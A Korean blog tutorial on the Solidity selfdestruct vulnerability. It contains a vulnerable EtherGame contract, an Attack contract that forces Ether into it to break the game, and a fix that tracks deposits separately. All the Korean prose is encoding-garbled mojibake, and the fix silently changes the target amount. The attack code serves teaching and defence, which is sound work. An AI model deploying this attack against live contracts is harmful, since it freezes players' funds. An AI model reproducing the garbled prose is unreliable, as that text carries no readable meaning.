---
emoji: ğŸ§¢
title: (ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 9) Self Destruct
date: '2022-01-09 17:29:00'
author: í•œì„±ì›
tags: Self Destruct selfdestruct ì·¨ì•½ì  SmartContract
categories: ì·¨ì•½ì ë¶„ì„
---


# ğŸ‘‹ Self Destruct

## ë“¤ì–´ê°€ê¸°ì „
### Self Destructë€ ë¬´ì—‡ì¸ê°€?
1. self destructëŠ” contractë¥¼ ì‚­ì œí•  ìˆ˜ ìˆëŠ” ìœ ì¼í•œ ìˆ˜ë‹¨ì´ë‹¤.
2. contractì•ˆì— ë‚¨ì•„ìˆëŠ” Etherë¥¼ addressì—ê²Œ ë°˜í™˜í•œë‹¤.

```solidity
selfdestruct(anAddress)
```

selfdestructë¥¼ ì‹¤í–‰ì‹œí‚¤ë©´ anAddressì—ê²Œ contractì— ë‚¨ì•„ìˆëŠ” Etherì´ ë°˜í™˜ëœë‹¤. ë§Œì•½ì— ë°˜í™˜í•˜ëŠ” addressëŠ” EOAì™€ CA ëª¨ë‘ ë„£ì„ ìˆ˜ ìˆë‹¤. í•˜ì§€ë§Œ ë°˜í™˜í•œ CAê°€ payableì´ ì•„ë‹ˆë¼ë©´ ë°˜í™˜ëœ Etherì€ ë‹¤ì‹œëŠ” ì°¾ì„ ìˆ˜ ì—†ê²Œëœë‹¤. ì¦‰ ë°˜í™˜ëœ CAì— ì˜ì›íˆ __LOCK__ ëœë‹¤.

ë³´ë‹¤ ì˜ ì´í•´í•˜ê¸° ìœ„í•´ Example Codeë¥¼ ì‚´í´ë³´ì!!
- - -

## Example code
ê°„ë‹¨í•œ codeë¡œ ì´í•´í•´ë³´ì!
```solidity
contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
```
ì´ contractëŠ” 7ë²ˆì§¸ë¡œ deposit()í•˜ì—¬ 7 Etherë¥¼ ê°€ì ¸ê°ˆ ìˆ˜ ìˆëŠ” ê²Œì„ì´ë‹¤.
deposit()ì„ callí•  ë•Œ msg.valueëŠ” 1 Etherë§Œ ì„¤ì •í•  ìˆ˜ ìˆë‹¤.


ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.
1. EtherGame contractê°€ ë°°í¬ëœë‹¤.
2. Aì™€ Bê°€ ê°ê° 1 Etherë¥¼ deposit() í•œë‹¤.
3. ëˆ„êµ°ê°€ EtherGame contractì˜ ì£¼ì†Œì™€ í•¨ê»˜ Attack contractë¥¼ ë°°í¬í•œë‹¤.
4. ê·¸ë¦¬ê³  Attack.attack()ì„ call í•œë‹¤.
5. EtherGameì€ ë” ì´ìƒ ì‹¤í–‰ë  ìˆ˜ ì—†ê²Œë˜ë©° ëˆ„êµ¬ë„ winnerê°€ ë  ìˆ˜ ì—†ê²Œ ëœë‹¤.

EtherGame contractì˜ íŠ¹ì„±ìƒ selfdestruct ê³µê²©ì— ì·¨ì•½í•  ìˆ˜ ë°–ì— ì—†ê²Œ ì„¤ê³„ ë˜ì–´ìˆë‹¤. 


- - -

## How to prevent?
EtherGame contractì—ì„œ selfdestructë¥¼ ì˜ˆë°©í•˜ê¸° ìœ„í•´ì„œëŠ” ```address(this).balance``` ëŒ€ì‹  deposit()ì„ í†µí•´ ë“¤ì–´ì˜¨ balanceë¥¼ ë”°ë¡œ ì €ì¥í•´ì£¼ê³  ì €ì¥í•œ ë³€ìˆ˜ì™€ ìƒí˜¸ì‘ìš©í•˜ë©´ ëœë‹¤. ìœ„ì— contractì˜ ë³€ìˆ˜ì™€ deposit()ì„ ì•„ë˜ì™€ ê°™ì´ ë°”ê¾¸ë©´ ëœë‹¤!
```solidity 
contract EtherGame {
    uint public targetAmount = 3 ether;
    // ë°”ë€ ë¶€ë¶„!!!
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        //ë°”ë€ ë¶€ë¶„!!!
        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }
}
```

- - -

## ë§ˆë¬´ë¦¬
selfdestructëŠ” ì¢€ í¥ë¯¸ë¡­ë‹¤. ë¸”ë¡ì²´ì¸ ì´ì™¸ì—ì„œ ë“¤ì–´ë³¸ì ë„ ì—†ëŠ” ê²ƒì´ë¼ íŠ¹ë³„í•˜ë‹¤ê³  ìƒê°ëœë‹¤. ì–´ë–¤ contractë“  selfdestructì— ì˜í•´ì„œ Etherë¥¼ ë°›ì„ ìˆ˜ ìˆë‹¤. ê·¸ë ‡ê¸° ë•Œë¬¸ì— ```address(this).balance```ì™€ ê°™ì€ contractì˜ balanceë¥¼ ì‚¬ìš©í•´ balanceë¥¼ ë¶ˆëŸ¬ì˜¤ëŠ” ê²ƒì„ ìì œí•˜ê³  ê¼­ í•„ìš”í• ë•Œë§Œ ì‚¬ìš©í•˜ì!!

- - -

### Reference
- https://swcregistry.io/docs/SWC-106
- https://solidity-by-example.org/hacks/self-destruct/

```toc

```